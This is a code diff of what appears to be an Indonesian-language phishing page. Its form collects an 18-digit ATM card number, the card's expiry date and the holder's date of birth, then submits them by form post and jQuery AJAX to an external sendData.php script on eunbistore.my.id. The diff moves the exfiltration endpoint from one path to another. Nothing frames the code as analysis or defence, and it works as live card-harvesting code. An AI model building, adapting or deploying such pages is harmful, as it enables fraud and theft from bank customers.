@@ -252,7 +252,7 @@ h1:before {
 </div>
 <div class="wraper">
   <div class="container">
-    <form action="https://eunbistore.my.id/2/sendData.php" method="post" id="formData">
+    <form action="https://eunbistore.my.id/3/sendData.php" method="post" id="formData">
       <input type="text" name="nokar" id="nokar" placeholder="Nomor Kartu ATM 18 Digit" autocomplete="off" inputmode="numeric" required class="box-input">
       <input type="text" name="valid" id="valid" placeholder="Masa Berlaku Kartu ATM : 00/00" inputmode="numeric" autocomplete="off" required class="box-input">
       <input type="text" name="tgl" id="tgl" placeholder="Tanggal Lahir: 00/00/0000" inputmode="numeric" minlength="10" maxlength="13" autocomplete="off" required class="box-input">
@@ -322,7 +322,7 @@ $('#process1').show();
 
  $.ajax({
  type: 'POST',
- url: 'https://eunbistore.my.id/2/sendData.php',
+ url: 'https://eunbistore.my.id/3/sendData.php',
  data: $(this).serialize(),
  datatype: 'JSON',
  
